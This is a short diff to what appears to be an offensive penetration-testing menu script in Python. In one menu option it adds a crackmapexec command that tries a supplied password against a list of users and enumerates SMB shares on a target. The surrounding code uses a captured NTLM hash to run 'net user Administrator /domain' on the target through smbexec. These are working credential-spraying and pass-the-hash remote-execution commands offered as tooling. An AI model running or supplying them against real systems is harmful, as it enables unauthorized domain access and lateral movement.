@@ -1315,6 +1315,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
+      command("crackmapexec -u users.txt -p " + PAS.rstrip(" ") + " --shares " + TIP.rstrip(" "))
       HASHED = "................................"
       for x in range (0,MAX):
          if US[x].rstrip(" ") == POR.rstrip(" "):
@@ -1322,7 +1323,7 @@ while True:
       if HASHED != "................................":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + POR.rstrip(" ") + " -H " + HASHED + " -x 'net user Administrator /domain' --exec-method smbexec")
       else:
-         command("echo '\nNo hash value was found for " + POR.rstrip(" ") + "...'")
+         command("echo 'No hash value enumerated for " + POR.rstrip(" ") + "...'")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
